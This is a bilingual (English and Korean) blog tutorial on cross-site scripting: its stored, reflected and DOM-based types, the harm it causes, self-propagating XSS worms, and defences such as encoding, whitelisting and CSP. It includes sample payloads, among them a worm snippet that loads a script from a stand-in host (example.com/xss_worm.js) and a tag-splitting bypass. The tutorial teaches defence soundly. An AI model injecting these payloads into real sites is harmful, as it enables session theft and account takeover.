---
title: Cross-Site Scripting Attack
tags: XSS Web-Hacking Cybersecurity
key: page-xss_attack
categories: [Cybersecurity, Web Security]
author: hyoeun
math: true
mathjax_autoNumber: true
---

## The Cross-Site Scripting Attack

Let's explore **Cross-Site Scripting (XSS)**, one of the most common and dangerous vulnerabilities in web application security. XSS is a security flaw that occurs when a website fails to properly handle user input, allowing an attacker to inject malicious scripts into web pages that then execute in other users' browsers.

### What is a Cross-Site Scripting (XSS) Attack?

Early web browsers tended to completely trust code originating from the same website domain. This meant that code from a specific website had the authority to do anything associated with that website's resources (e.g., cookies) and could send other requests. This fundamental trust model is what makes XSS attacks possible.

  * An attacker can launch an attack by injecting malicious code into the victim's browser. While web browsers typically have **Sandbox protection** to prevent code from different domains from accessing a website's resources (enforced by the Same-Origin Policy), this protection has limitations.
  * However, if an attacker **succeeds in injecting attack code directly into the target web page**, the browser will perceive and execute that code as part of the legitimate target website. This is what we call a **Cross-Site Scripting (XSS) attack.**
  * Consequently, the attacker plants code on the target website. The victim's browser mistakes this malicious code for legitimate code from the target website.
  * This allows the attacker to modify cookies associated with that website (especially session cookies), send other HTTP requests, or perform any action the victim can within that website. If the victim has an **active session**, virtually anything might be permitted within the context of that website.

### XSS Attacks on Mobile Environments

XSS attacks aren't limited to traditional web browser environments. **XSS attacks are certainly possible in mobile environments,** especially in apps that render web content. While native apps themselves aren't direct targets of XSS attacks, they can be exposed to XSS vulnerabilities in specific scenarios:

1.  **Apps Using WebViews:**
    Many mobile apps use a 'WebView' component to display web content within the app (e.g., in-app browsers, features implemented using web technologies). If this WebView renders user input directly without proper validation or escaping, malicious scripts can be injected in the same way as web-based XSS. This can lead to session information theft or phishing page displays within the WebView. XSS can also occur when deep links pass user input parameters to content loaded in a WebView, and these parameters aren't securely handled by the WebView.

2.  **Hybrid Apps:**
    Hybrid app development frameworks like React Native, Ionic, Cordova, and Flutter (which are WebView-based) combine native code with web technologies (HTML, CSS, JavaScript). Since these apps fundamentally rely on web technologies, they are exposed to the same XSS vulnerabilities as web applications. They become vulnerable if developers fail to perform thorough validation and encoding of user input and output.

3.  **Apps Displaying User-Generated Content (UGC):**
    In mobile apps that display user-generated content, such as chat apps or social media apps, if user messages or posts are not securely sanitized before display, malicious scripts included in the content can be delivered to and executed by other users. If unsanitized user-generated content is included in push notifications, scripts could even execute when the notification is displayed.

4.  **Client-Side Data Storage:**
    Some mobile apps store user input locally on the device. If this data contains an XSS script and is later loaded by the app's WebView component or other web-based UI without secure handling, XSS can occur.

**In conclusion, native apps themselves are not direct targets of XSS attacks. XSS is a vulnerability that arises in environments processing web content. However, when native apps use WebViews to display web content or implement communication between native code and WebViews, the risks of web security can transfer to the app. In such cases, XSS attacks can occur within the WebView, potentially impacting the overall security of the app. Therefore, it's a misconception to say that "native apps shouldn't be used"; rather, it's crucial to strictly adhere to web security best practices when using WebViews within mobile apps.**

### Types of XSS Attacks

XSS attacks can broadly be categorized into three types, depending on how malicious scripts are injected and executed in a web page.

#### Persistent (Stored) XSS Attack

A **Persistent (Stored) XSS attack** occurs when **user input containing a malicious script is saved as a payload on the target server's database or file system, and then any user accessing the application part containing that payload triggers the malicious script.**

  * For example, an attacker might enter a script like `<script>alert('You are hacked!');</script>` into their profile editing field or a forum comment section and save it to the server.
  * When other users view that profile or post, the server includes the saved malicious script code directly in the web page and sends it to the user's browser. The browser then executes this code.
  * This issue primarily arises because the server-side **fails to properly sanitize HTML markup** when saving user input to the database.
  * Since the browser cannot distinguish whether this code was generated by the server or is malicious code inserted by someone else, it **executes the code with the user's privileges.**

#### Non-persistent (Reflected) XSS Attack

A **Non-persistent (Reflected) XSS attack** is an attack technique where a **web application does not safely sanitize user input contained in an HTTP request, and instead generates a response with the malicious script, causing the script to execute on the client (browser).**

  * This attack is primarily carried out by **distributing a malicious URL to users and enticing them to click it.**
  * When a user clicks the malicious URL, the script contained within the URL is sent to the server. The server then "reflects" it back in the web page response to the user's browser. The user's browser perceives this reflected script as legitimate code and executes it.
  * Common scenarios involve user input being displayed unfiltered in search results pages, error messages, or other immediate responses.

#### DOM-based XSS

**DOM-based XSS** is an attack technique where an **attacker injects a payload into the DOM (Document Object Model), and the malicious script executes as part of DOM construction every time the victim's browser loads the HTML page.**

  * Unlike other XSS types, the key difference is that DOM-based XSS **occurs solely within the browser, independent of the server.** This means the server's response itself might be clean, but client-side JavaScript code mishandles user input in the DOM environment.
  * The source code of the page itself might not change, but the browser-side code embedded in the page dynamically generates and executes malicious code within the DOM environment based on user input.

### What Damage Can XSS Cause?

XSS attacks can cause various types of severe damage.

  * **Web Defacing:** JavaScript code can use DOM APIs to create, remove, or modify the DOM of the hosting page. This allows attackers to alter the entire appearance of a web page or even create fake login pages, effectively defacing the website.
  * **Spoofing Requests:** JavaScript code can generate and send HTTP requests. This enables attackers to send forged requests to the server with the victim's browser privileges (e.g., password changes, account transfers, administrative privilege requests), causing unintended actions. This is similar to CSRF (Cross-Site Request Forgery) attacks, but XSS is more powerful because the attacker can manipulate all requests from the client side.
  * **Stealing Information:** A victim's private data (e.g., session cookies, personally identifiable information, login credentials) can be easily transmitted to the attacker via JavaScript. By using stolen session cookies, attackers can log into the victim's account and impersonate their identity.
  * **Malware Distribution:** Attackers can use XSS to induce drive-by downloads in the victim's browser or load other malicious scripts to distribute additional malware.

### XSS Attacks in Action

To execute a real XSS attack, a thorough analysis of how the target website operates is crucial.

  * **Before launching an attack, you must first analyze how the target website functions.** This includes examining HTTP headers and URLs when performing actions where you intend to inject code (e.g., creating a post, searching). This helps identify where input is transmitted and how it's processed.
  * **During an attack, it's essential to meticulously check every spelling to avoid syntax errors.** Since the attack code varies depending on the specific characteristics of each target site (e.g., encoding used, filtering methods), **it's difficult to provide a standardized approach.**
  * Once you've thoroughly analyzed the URL patterns for the intended action, you can encode the malicious script code appropriately to fit those patterns. By skillfully using JavaScript's `XMLHttpRequest` object and functions like `open()`, `setRequestHeader()`, and `send()`, you can succeed in sending additional forged requests from the victim's browser to the server.

### Achieving Self-Propagation

Some XSS attacks can evolve into "worms" that self-replicate and spread through infected web pages. This typically occurs either by manipulating the DOM API or by propagating via links using the `src` attribute.

#### DOM Approach

When a web page is loaded by a browser, the browser creates a **DOM (Document Object Model)** based on the page's content. The DOM organizes the content of each page into a tree structure of DOM nodes.

  * In this type of attack, we can use JavaScript code with the DOM API to extract the content of specific DOM nodes and include it in a malicious payload.

  * For example, if a malicious script already embedded in the page resides within a `<script>` tag with a specific `id`, you can use a DOM API like `document.getElementById("worm").innerHTML` to extract the source code of that script. The extracted code can then be re-injected into other user input fields or sent to the server via AJAX requests to trigger a stored XSS.

  * This method doesn't involve completely writing new code; instead, it **leverages the DOM API to "elegantly" retrieve specific content from the existing page (including the malicious code you inserted) and then deliver it elsewhere.**

    ```javascript
    <script id="worm">
    // Use DOM API to get a copy of the content in a DOM node.
    var strCode = document.getElementById("worm").innerHTML;

    // Displays the tag content (for demonstration purposes)
    alert(strCode);

    // In a real attack, strCode would be used to create new malicious content
    // and submit it to the server (e.g., via AJAX POST request to update profile)
    // or inject into other parts of the DOM.
    </script>
    ```

#### Link Approach

This method involves self-replication by loading a malicious JavaScript file externally.

  * The attacker hosts a `.js` file containing the malicious script on their own server (e.g., `http://example.com/xss_worm.js`).

  * The attacker then uses a `<script>` tag that dynamically inserts this `.js` file via its `src` attribute as an XSS payload.

  * In the example below, the `wormCode` variable contains an encoded `script` tag string. When this string is injected into a web page, the browser loads and executes the `xss_worm.js` file. This `.js` file can then contain logic to further propagate itself to other users.

    ```javascript
    var wormCode = encodeURIComponent(
        "<script type=\"text/javascript\" "
        + "src=\"http://example.com/xss_worm.js\">"
        + "</" + "script>");

    // This is an example of setting content for a description field on a specific website.
    var desc="&description=SAMY is MY HERO" + wormCode;

    // (the rest of the code would be similar to how malicious input is submitted)
    // For example, an AJAX request to update a user's profile with this 'desc' payload.
    // ...
    ```

  * The reason for separating the `</script>` part into `</" + "script>` in the code above is that **some browsers, like Firefox, might parse `</script>` as a single token and unintentionally close the script tag prematurely.** This is an important bypass technique that can vary depending on the browser's parsing method.

### Preventing XSS Attacks

The fundamental reason XSS attacks occur is the **failure to properly separate data and code.** However, in a web environment that must support HTML markup, completely separating the two is by no means easy.

Generally, there are two main approaches to preventing XSS: removing malicious code from user input, or making it ineffective so it doesn't execute. In most cases, a combination of these two methods is used to prevent XSS.

**Important: Network-based security solutions like IDS (Intrusion Detection Systems), IPS (Intrusion Prevention Systems), and WAF (Web Application Firewalls) alone cannot fully prevent XSS.** These solutions rely on pattern-based detection, making it difficult to block cleverly bypassed XSS attacks. Therefore, **defense at the application layer (i.e., input filtering and output encoding) is essential.**

#### Filter Approach

The **filtering approach** aims to 'remove' malicious code from user input. However, this is extremely challenging.

  * Simply removing `<script>` tags is insufficient. **Various methods exist to execute JavaScript**, such as the `onerror` attribute of `<img>` tags, `href` attributes of `<a>` tags (JavaScript URLs), `<iframe>` tags, and more.
  * Implementing such filtering logic perfectly on your own is highly complex and prone to errors. Therefore, it's advisable to **use well-tested open-source libraries like jsoup.** These libraries are designed to perform HTML parsing and sanitization securely.

#### Encoding Approach

The **encoding approach** involves **transforming code so that the browser interprets it as plain text rather than executable code.**

  * For example, the `<` character is converted to `&lt;`, and the `>` character to `&gt;`. The browser will render `&lt;script&gt;` as literal text `<script>` and not recognize it as a script tag to be executed.
  * When the browser recognizes these "representations" as text only, it **means the injected code will not execute.**
  * **Use the appropriate encoding method based on the output context** (e.g., HTML entity encoding for HTML context, JavaScript string encoding for JavaScript context, URL encoding for URL context).

### Considerations for XSS Prevention: Whitelist vs. Blacklist

When filtering input for XSS defense, there's a discussion about which is better: the **Whitelist** approach or the **Blacklist** approach.

  * **Blacklist Approach:** Defines known malicious patterns (e.g., `<script>` tags, `javascript:` URL schemes) and blocks or removes input containing those patterns. This method is **highly vulnerable to bypass techniques.** Attackers can cleverly mutate blacklist patterns to circumvent defense mechanisms.
  * **Whitelist Approach:** Defines only permitted safe input patterns (e.g., alphabetic characters, numbers, specific allowed special characters) and rejects or removes all input that does not conform to these patterns. This method is **generally considered a safer and stronger defense.** By explicitly specifying what's allowed, it can effectively defend against unknown attack patterns as well.
  * **To Consider:** While it varies by case, **whitelisting is generally easier to implement (as you only need to define allowed characters or tags) and can ensure users operate within expected input ranges, making it potentially better.** For example, text fields might only allow alphabetic characters, numbers, and a few basic punctuation marks, while a forum allowing HTML might only permit a limited set of safe tags like `<b>`, `<i>`, `<u>`.

### Using Content Security Policy (CSP)

**Using Content Security Policy (CSP)** is one of the most effective ways to mitigate XSS attacks.

  * CSP is a method to **prevent XSS by setting policies for script execution.** The web server defines which web resources (scripts, stylesheets, images, etc.) can be loaded and executed via the `Content-Security-Policy` HTTP response header.
  * For example, setting a directive like `script-src 'self'` instructs the browser to **only allow scripts originating from its own server (same origin) to execute.** This blocks malicious scripts injected from external sources, significantly reducing the likelihood of a successful XSS attack.
  * While CSP is not a single, complete defense against XSS, it **provides a strong additional layer of defense when used in conjunction with other XSS prevention techniques** (input filtering, output encoding).

## References

  * [COMPUTER SECURITY: A Hands-on Approach by Wenliang Du](https://www.amazon.com/Computer-Security-Hands-Approach-Wenliang/dp/154836794X)
  * [Detailed Resource (Excess XSS)](https://excess-xss.com/)

-----

## The Cross-Site Scripting Attack

웹 애플리케이션 보안에서 가장 흔하고 위험한 취약점 중 하나인 **크로스-사이트 스크립팅(Cross-Site Scripting, XSS)** 공격에 대해 알아보겠습니다. XSS는 웹사이트가 사용자 입력을 제대로 처리하지 않아 발생하는 보안 결함으로, 공격자가 웹 페이지에 악성 스크립트를 삽입하여 다른 사용자들의 브라우저에서 실행되도록 만들 수 있습니다.

### What is a Cross-Site Scripting (XSS) Attack?

초기의 웹 브라우저는 웹사이트에서 제공하는 코드를 해당 웹사이트의 도메인에서 온 것으로 간주하고 전적으로 신뢰하는 경향이 있었습니다. 즉, 특정 웹사이트에서 온 코드는 그 웹사이트와 관련된 모든 리소스(예: 쿠키)에 접근하고, 다른 요청을 보내는 등 무엇이든 할 수 있는 권한을 가졌습니다. 이러한 기본 신뢰 모델 때문에 XSS 공격이 가능해집니다.

  * 공격자가 피해자의 브라우저에 악성 코드를 주입하면 공격이 이루어질 수 있습니다. 기본적으로 웹 브라우저에는 **샌드박스(Sandbox) 보호 기능**이 있어, 다른 도메인의 페이지에서 온 코드는 해당 웹사이트의 리소스에 접근할 수 없습니다. 이것은 동일 출처 정책(Same-Origin Policy)에 의해 강제됩니다.
  * 그러나 공격자가 **타겟 웹 페이지 자체에 공격 코드를 주입하는 데 성공**하면, 브라우저는 해당 코드를 타겟 웹사이트의 일부로 인식하고 실행하게 됩니다. 이를 **크로스-사이트 스크립팅(XSS) 공격**이라고 부릅니다.
  * 따라서 공격자는 타겟 웹사이트에 코드를 심어 공격을 수행합니다. 피해자의 브라우저는 이 악성 코드를 타겟 웹사이트에서 온 합법적인 코드로 착각하게 됩니다.
  * 이로 인해 공격자는 해당 웹사이트와 연관된 쿠키(특히 세션 쿠키)를 수정하거나, 다른 HTTP 요청을 보내거나, 피해자가 웹사이트 내에서 할 수 있는 모든 작업을 수행할 수 있습니다. 특히 피해자가 **활성 세션(active session)을 가지고 있다면**, 해당 웹사이트 내에서는 어떠한 행위라도 허용될 수 있습니다.

### XSS Attacks on Mobile Environments

XSS 공격은 전통적인 웹 브라우저 환경에만 국한되지 않습니다. **모바일 환경에서도 XSS 공격은 충분히 가능하며,** 특히 웹 콘텐츠를 렌더링하는 앱에서 발생할 수 있습니다. 네이티브 앱 그 자체는 XSS 공격의 직접적인 대상이 아니지만, 다음과 같은 경우에 XSS 취약점에 노출될 수 있습니다.

1.  **웹뷰(WebView)를 사용하는 앱:**
    많은 모바일 앱은 앱 내에서 웹 콘텐츠를 표시하기 위해 '웹뷰'라는 구성 요소를 사용합니다 (예: 인앱 브라우저, 특정 기능을 웹 기반으로 구현한 경우). 만약 이 웹뷰가 사용자 입력을 제대로 검증하거나 이스케이프하지 않고 웹 콘텐츠를 렌더링한다면, 웹 기반 XSS와 동일한 방식으로 악성 스크립트가 주입되어 웹뷰 내에서 실행될 수 있습니다. 이는 웹뷰 내에서 사용자 세션 정보 탈취, 피싱 페이지 표시 등의 피해로 이어질 수 있습니다. 딥 링크(Deep Link)가 웹뷰로 로드되는 콘텐츠에 사용자 입력 매개변수를 전달하고, 이 매개변수가 웹뷰에서 안전하게 처리되지 않을 때도 XSS가 발생할 수 있습니다.

2.  **하이브리드 앱(Hybrid Apps):**
    React Native, Ionic, Cordova, Flutter (웹뷰 기반)와 같은 하이브리드 앱 개발 프레임워크는 네이티브 코드와 웹 기술(HTML, CSS, JavaScript)을 혼합하여 사용합니다. 이들 앱은 기본적으로 웹 기술을 사용하므로, 웹 애플리케이션과 동일한 XSS 취약점에 노출될 수 있습니다. 개발자가 사용자 입력 및 출력에 대한 철저한 유효성 검사 및 인코딩을 수행하지 않으면 취약해집니다.

3.  **사용자 생성 콘텐츠가 표시되는 앱:**
    채팅 앱, 소셜 미디어 앱 등 사용자 생성 콘텐츠(UGC)를 표시하는 모바일 앱에서, 사용자 메시지나 게시물이 안전하게 위생 처리되지 않고 표시될 경우, 악성 스크립트가 포함된 콘텐츠가 다른 사용자에게 전달되어 실행될 수 있습니다. 푸시 알림에 위생 처리되지 않은 사용자 생성 콘텐츠가 포함될 경우, 알림이 표시될 때 스크립트가 실행될 수도 있습니다.

4.  **클라이언트 측 데이터 저장:**
    일부 모바일 앱은 사용자 입력을 기기 내에 로컬로 저장합니다. 만약 이 데이터가 XSS 스크립트를 포함하고 있고, 나중에 앱의 웹뷰 컴포넌트나 다른 웹 기반 UI에서 이 데이터를 안전하게 처리하지 않고 로드한다면 XSS가 발생할 수 있습니다.

**결론적으로, 네이티브 앱 그 자체는 XSS 공격의 직접적인 대상이 아니지만, 웹 콘텐츠를 렌더링하는 웹뷰나 하이브리드 프레임워크를 사용하는 앱은 웹 기반 XSS 공격에 취약할 수 있습니다. 따라서 모바일 앱 개발 시에도 웹 애플리케이션 보안에서 강조되는 입력 유효성 검사, 출력 인코딩, CSP(Content Security Policy) 설정 등의 XSS 방어 기법을 철저히 적용해야 합니다.**

### Types of XSS Attacks

XSS 공격은 악성 스크립트가 웹 페이지에 주입되고 실행되는 방식에 따라 크게 세 가지 유형으로 분류할 수 있습니다.

#### Persistent (Stored) XSS Attack

**지속 XSS (Persistent XSS) 또는 저장 XSS (Stored XSS)**는 **악성 스크립트가 포함된 사용자 입력값이 타겟 서버의 데이터베이스나 파일 시스템에 페이로드(payload)로 저장되고, 이 페이로드를 포함하는 애플리케이션 부분에 접근하는 모든 사용자가 악성 스크립트를 트리거하게 되는 공격**입니다.

  * 예를 들어, 공격자가 자신의 프로필 수정란이나 게시판 댓글 입력란에 `<script>alert('You are hacked!');</script>`와 같은 스크립트 코드를 기입하고 이를 서버에 저장시킵니다.
  * 다른 사용자들이 해당 프로필을 보거나 게시물을 열람하게 되면, 서버는 저장된 악성 스크립트 코드를 그대로 웹 페이지에 포함하여 사용자 브라우저로 전송합니다. 브라우저는 이 코드를 실행하게 됩니다.
  * 이러한 문제는 주로 서버 측에서 사용자 입력값을 데이터베이스에 저장할 때 **HTML 마크업을 제대로 위생 처리(sanitize)하지 않았기 때문에** 발생합니다.
  * 브라우저는 이러한 코드가 서버에서 생성된 것인지, 아니면 다른 사람이 삽입한 악성 코드인지 구별할 수 없기 때문에, 해당 코드를 **사용자의 권한으로 실행시켜버립니다.**

#### Non-persistent (Reflected) XSS Attack

**비지속 XSS (Non-persistent XSS) 또는 반사 XSS (Reflected XSS)**는 **웹 애플리케이션이 HTTP 요청에 포함된 사용자 입력값을 안전하게 위생 처리하지 않고, 악성 스크립트가 있는 채로 응답을 생성하여 악성 스크립트가 클라이언트(브라우저)에서 실행되는 공격 기법**입니다.

  * 이 공격은 주로 사용자에게 **악성 URL을 배포하여 사용자가 그것을 클릭하도록 유도**함으로써 이루어집니다.
  * 사용자가 악성 URL을 클릭하면, URL에 포함된 스크립트가 서버로 전송되고, 서버는 이를 웹 페이지 응답에 "반사"하여 사용자 브라우저로 다시 보냅니다. 사용자 브라우저는 이 반사된 스크립트를 합법적인 코드로 인식하고 실행합니다.
  * 일반적인 시나리오는 검색 결과 페이지, 오류 메시지 또는 기타 즉각적인 응답에서 사용자 입력이 필터링되지 않고 표시되는 경우입니다.

#### DOM-based XSS

**DOM 기반 XSS (DOM-based XSS)**는 **공격자가 DOM(Document Object Model)에 페이로드(payload)를 주입하여 피해자의 브라우저가 HTML 페이지를 로드할 때마다 악성 스크립트가 DOM 생성의 일부로 실행되면서 공격하는 기법**입니다.

  * 다른 XSS 유형과는 다르게, DOM 기반 XSS는 **서버와 관계없이 브라우저 내에서만 발생**하는 것이 가장 큰 차이점입니다. 즉, 서버의 응답 자체는 깨끗할 수 있지만, 클라이언트 측 JavaScript 코드가 DOM 환경에서 사용자 입력을 안전하지 않게 처리할 때 발생합니다.
  * 페이지 자체의 소스 코드는 변하지 않을 수 있으나, 페이지에 포함되어 있는 브라우저 측 코드가 사용자 입력에 따라 DOM 환경에서 악성 코드를 동적으로 생성하고 실행합니다.

### What Damage Can XSS Cause?

XSS 공격은 다양한 종류의 심각한 피해를 유발할 수 있습니다.

  * **Web Defacing (웹사이트 변조):** JavaScript 코드는 DOM API를 사용하여 호스팅 페이지의 DOM을 생성, 제거 또는 변경할 수 있습니다. 이를 통해 공격자는 웹 페이지의 형태 자체를 바꿔버리거나, 가짜 로그인 페이지를 만드는 등 웹사이트를 변조할 수 있습니다.
  * **Spoofing Requests (요청 위조):** JavaScript 코드는 HTTP 요청을 생성하고 보낼 수 있습니다. 이를 통해 공격자는 피해자 브라우저의 권한으로 서버에 위조된 요청(예: 비밀번호 변경, 계정 이체, 관리자 권한 요청)을 보내어 의도치 않은 작업을 수행하게 할 수 있습니다. 이는 CSRF(Cross-Site Request Forgery) 공격과 유사하지만, XSS는 공격자가 클라이언트 측에서 모든 요청을 조작할 수 있다는 점에서 더 강력합니다.
  * **Stealing Information (정보 탈취):** 피해자의 개인 데이터(예: 세션 쿠키, 개인 식별 정보, 로그인 자격 증명)를 JavaScript를 통해 쉽게 공격자에게 전송할 수 있습니다. 탈취된 세션 쿠키를 이용하면 공격자는 피해자의 계정에 로그인하여 권한을 도용할 수 있습니다.
  * **Malware Distribution (악성코드 배포):** 공격자는 XSS를 이용하여 피해자의 브라우저에서 드라이브-바이 다운로드(drive-by download)를 유도하거나, 다른 악성 스크립트를 로드하여 추가적인 악성코드를 배포할 수 있습니다.

### XSS Attacks in Action

실제 XSS 공격을 수행하기 위해서는 타겟 웹사이트의 작동 방식을 면밀히 분석하는 것이 중요합니다.

  * **공격에 앞서, 우선 타겟 웹사이트가 어떤 식으로 작동하는지, 우리가 코드를 주입하고자 하는 행위(예: 게시물 작성, 검색)를 실행했을 때 HTTP 헤더와 URL이 어떻게 변하는지 등을 분석해야 합니다.** 이를 통해 입력값이 어디로 전달되고 어떻게 처리되는지 파악할 수 있습니다.
  * **공격 시에는 구문 오류가 없도록 스펠링 하나하나를 잘 확인해야 하며**, 타겟 사이트마다 가지는 특성(사용하는 인코딩, 필터링 방식 등)에 따라 공격 코드가 달라지기 때문에 **정형화된 방식을 제시하기는 어렵습니다.**
  * 분석한 액션에 대한 URL 패턴을 잘 파악하고, 그 패턴에 맞춰 악성 스크립트 코드를 적절히 인코딩하여 삽입합니다. JavaScript의 `XMLHttpRequest` 객체를 사용하여 `open()`, `setRequestHeader()`, `send()`와 같은 함수들을 잘 활용하면, 피해자 브라우저에서 서버로 추가적인 위조 요청을 보내는 공격에 성공할 수 있을 것입니다.

### Achieving Self-Propagation

일부 XSS 공격은 감염된 웹 페이지를 통해 스스로를 복제하고 확산시키는 "웜(Worm)"과 같은 형태로 진화할 수 있습니다. 이는 주로 DOM API를 통하거나 `src` 속성을 이용하여 링크로 퍼뜨리는 방식으로 이루어집니다.

#### DOM Approach

웹 페이지가 브라우저에 의해 로드될 때, 브라우저는 해당 페이지의 내용을 기반으로 **DOM(Document Object Model)을 생성**합니다. DOM은 각 페이지의 콘텐츠를 DOM 노드 형태로 트리(tree) 구조로 구성합니다.

  * 이 방식으로 공격할 때, 우리는 JavaScript 코드를 통해 DOM API를 사용하여 특정 DOM 노드의 내용을 추출하고 이를 악성 페이로드에 포함시킬 수 있습니다.

  * 예를 들어, 이미 페이지에 삽입된 악성 스크립트 자체가 특정 `id`를 가진 `<script>` 태그 내에 있다면, `document.getElementById("worm").innerHTML`과 같은 DOM API를 사용하여 해당 스크립트의 소스 코드를 추출할 수 있습니다. 추출된 코드는 다시 다른 사용자 입력 필드에 삽입되거나, AJAX 요청을 통해 서버로 전송되어 저장 XSS를 유발할 수 있습니다.

  * 이 방식은 코드를 완전히 새로 작성하는 것이 아니라, **DOM API를 활용하여 기존 페이지의 특정 콘텐츠(자신이 삽입한 악성 코드 포함)를 "우아하게" 불러와 다른 곳에 실어 보내는 것**입니다.

    ```javascript
    <script id="worm">
    // Use DOM API to get a copy of the content in a DOM node.
    var strCode = document.getElementById("worm").innerHTML;

    // Displays the tag content (for demonstration purposes)
    alert(strCode);

    // In a real attack, strCode would be used to create new malicious content
    // and submit it to the server (e.g., via AJAX POST request to update profile)
    // or inject into other parts of the DOM.
    </script>
    ```

#### Link Approach

이 방식은 악성 JavaScript 파일을 외부에서 로드하는 방식으로 스스로를 복제합니다.

  * 공격자는 악성 스크립트가 담긴 `.js` 파일을 자신의 서버에 호스팅합니다 (예: `http://example.com/xss_worm.js`).

  * 이후 공격자는 `src` 속성을 이용하여 이 `.js` 파일을 동적으로 삽입하는 `<script>` 태그를 XSS 페이로드로 사용합니다.

  * 아래 예시에서 `warmCode` 변수는 인코딩된 `script` 태그 문자열을 포함합니다. 이 문자열이 웹 페이지에 주입되면, 브라우저는 `xss_worm.js` 파일을 로드하여 실행하게 됩니다. 이 `.js` 파일은 다시 다른 사용자에게 확산될 수 있는 로직을 포함할 수 있습니다.

    ```javascript
    var wormCode = encodeURIComponent(
        "<script type=\"text/javascript\" "
        + "src=\"http://example.com/xss_worm.js\">"
        + "</" + "script>");

    // This is an example of setting content for a description field on a specific website.
    var desc="&description=SAMY is MY HERO" + wormCode;

    // (the rest of the code would be similar to how malicious input is submitted)
    // For example, an AJAX request to update a user's profile with this 'desc' payload.
    // ...
    ```

  * 위 코드에서 `</script>` 부분을 `</" + "script>`와 같이 분리하여 문자열 처리하는 이유는, **Firefox와 같은 일부 브라우저가 파싱 시 `</script>`를 단일 토큰으로 인식하여 의도치 않게 스크립트 태그를 조기에 닫아버릴 수 있기 때문**입니다. 브라우저 파싱 방식에 따라 달라질 수 있는 중요한 우회 기법입니다.

### Preventing XSS Attacks

XSS 공격이 발생하는 근본적인 이유는 **데이터와 코드를 제대로 분리하지 못하기 때문**입니다. 하지만 HTML 마크업을 지원해야 하는 웹 환경에서는 이 둘을 완벽하게 분리하는 것이 결코 쉬운 일은 아닙니다.

일반적으로 사용자 입력으로부터 악성 코드를 제거하거나, 그것이 실행되지 않도록 무효화하는 두 가지 주요 접근 방식이 있습니다. 대부분의 경우, 이 두 가지 방법을 혼합하여 XSS를 예방합니다.

**중요: IDS (침입 탐지 시스템), IPS (침입 방지 시스템), 웹 방화벽(WAF)과 같은 네트워크 기반 보안 솔루션만으로는 XSS를 완전히 방지할 수 없습니다.** 이러한 솔루션은 패턴 기반 탐지에 의존하므로, 교묘하게 우회된 XSS 공격을 막기 어렵습니다. 따라서 **애플리케이션 계층에서의 방어(즉, 입력 필터링 및 출력 인코딩)가 필수적**입니다.

#### Filter Approach

**필터링 접근 방식**은 사용자 입력으로부터 악성 코드를 '지우는' 것을 목표로 합니다. 하지만 이것은 매우 어렵습니다.

  * 단순히 `<script>` 태그만을 제거하는 것은 불충분합니다. `<img>` 태그의 `onerror` 속성, `<a>` 태그의 `href` 속성(JavaScript URL), `<iframe>` 태그 등 **다양한 방식으로 JavaScript를 작동시킬 수 있는 방법들이 존재**하기 때문입니다.
  * 이러한 필터링 로직을 직접 완벽하게 구현하는 것은 매우 복잡하고 오류가 발생하기 쉽습니다. 따라서 **jsoup와 같은 잘 테스트된 오픈소스 라이브러리를 사용**하는 것이 좋습니다. 이러한 라이브러리는 HTML 파싱 및 위생 처리(sanitization)를 안전하게 수행하도록 설계되었습니다.

#### Encoding Approach

**인코딩 접근 방식**은 코드를 브라우저가 실행 가능한 코드로 해석하는 대신, **브라우저가 텍스트로만 보이도록 바꾸는 것**입니다.

  * 예를 들어, `<` 문자를 `&lt;`로, `>` 문자를 `&gt;`로 변환합니다. 브라우저는 `&lt;script&gt;`를 일반 텍스트 `<script>`로 렌더링할 뿐, 스크립트 태그로 인식하여 실행하지 않습니다.
  * 브라우저가 이러한 "표현(representations)"을 텍스트로만 인식하게 된다는 것은, **삽입된 코드가 실행되지 않음을 의미**합니다.
  * **출력 컨텍스트에 따라 적절한 인코딩 방식**을 사용해야 합니다 (예: HTML 컨텍스트에서는 HTML 엔티티 인코딩, JavaScript 컨텍스트에서는 JavaScript 문자열 인코딩, URL 컨텍스트에서는 URL 인코딩).

### Considerations for XSS Prevention: Whitelist vs. Blacklist

XSS 방어를 위한 입력값 필터링 시, **화이트리스트(Whitelist)** 방식과 **블랙리스트(Blacklist)** 방식 중 어떤 것이 더 나은지에 대한 논의가 있습니다.

  * **블랙리스트 방식:** 알려진 악성 패턴(예: `<script>` 태그, `javascript:` URL 스킴)을 정의하고, 해당 패턴을 포함하는 입력을 차단하거나 제거합니다. 이 방식은 **우회 기법(bypass techniques)에 매우 취약**합니다. 공격자는 블랙리스트 패턴을 교묘하게 변형하여 방어 메커니즘을 회피할 수 있습니다.
  * **화이트리스트 방식:** 허용되는 안전한 입력 패턴(예: 알파벳, 숫자, 특정 허용된 특수 문자)만을 정의하고, 이 패턴에 일치하지 않는 모든 입력을 거부하거나 제거합니다. 이 방식은 **일반적으로 더 안전하고 강력한 방어책**으로 간주됩니다. 허용하는 것만 명시하므로, 알려지지 않은 공격 패턴에 대해서도 효과적으로 방어할 수 있습니다.
  * **생각해볼 문제:** 경우에 따라 각각 다르겠지만, **화이트리스트가 일반적으로 구현하기 쉽고(허용할 문자나 태그를 명확히 정의하면 되므로) 사용자가 예상 범위 안에서만 입력할 수 있도록 만들 수 있어 좀 더 나을 수 있습니다.** 예를 들어, 텍스트 필드에는 알파벳, 숫자, 몇몇 기본적인 구두점만 허용하고, HTML을 허용하는 게시판에서는 `<b>`, `<i>`, `<u>`와 같이 제한된 안전한 태그만 허용하는 방식입니다.

### Using Content Security Policy (CSP)

**콘텐츠 보안 정책(Content Security Policy, CSP) 사용**은 XSS 공격을 완화하는 매우 효과적인 방법 중 하나입니다.

  * CSP는 **스크립트 실행에 대한 정책을 설정하여 XSS를 예방하는 방법**입니다. 웹 서버가 `Content-Security-Policy` HTTP 응답 헤더를 통해 어떤 웹 리소스(스크립트, 스타일시트, 이미지 등)를 로드하고 실행할 수 있는지 정의합니다.
  * 예를 들어, `script-src 'self'`와 같은 지시문을 설정하면, 브라우저는 **오직 자기 서버(동일 출처)에서 온 스크립트만 실행되도록 허용**합니다. 이는 외부에서 주입된 악성 스크립트가 실행되는 것을 차단하여 XSS 공격의 성공 가능성을 크게 낮춥니다.
  * CSP는 XSS 공격을 완전히 막는 단일 방어책은 아니지만, **다른 XSS 방어 기법(입력 필터링, 출력 인코딩)과 함께 사용될 때 강력한 추가적인 방어 계층을 제공**합니다.

## References

  * [COMPUTER SECURITY: A Hands-on Approach by Wenliang Du](https://www.amazon.com/Computer-Security-Hands-Approach-Wenliang/dp/154836794X)
  * [설명이 풍부한 자료 (Excess XSS)](https://excess-xss.com/)